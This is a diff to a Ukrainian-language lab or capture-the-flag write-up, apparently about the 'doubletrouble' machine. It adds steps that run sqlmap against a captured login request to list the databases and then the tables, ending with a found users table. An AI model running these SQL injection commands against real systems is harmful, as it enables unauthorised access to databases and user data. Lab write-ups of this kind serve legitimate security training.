@@ -183,8 +183,24 @@ Connection: keep-alive
 uname=&psw=&btnLogin=Login
 EOF
 
-Далі застосовую інструмент SQLMap для експлуатації вразливості SQL-інʼєкції: sqlmap -r sql --dbs
+І запускаю його у сомандному рядку.
 
 <img width="1301" height="943" alt="image" src="https://github.com/user-attachments/assets/8055c2a1-5101-4985-bee5-9ce4504a3fad" />
+
+Далі застосовую інструмент SQLMap для експлуатації вразливості SQL-інʼєкції: sqlmap -r sql --dbs
+
+<img width="1392" height="992" alt="image" src="https://github.com/user-attachments/assets/157285c9-eca7-4c1a-aa94-7f6d34365834" />
+
+В результаті виявляю бд: doubletrouble та information schemа, також версію MySQL 5.0.12 і пейлоуд.
+
+Застововую   --tables для перевірки наявних таблиць:
+
+sqlmap -r sql -D doubletrouble --tables --batch
+
+<img width="1488" height="441" alt="image" src="https://github.com/user-attachments/assets/f355fe14-2308-4a0c-94b3-57a38cc24ebd" />
+
+
+
+В результаті виявляю таблицю users
 
 
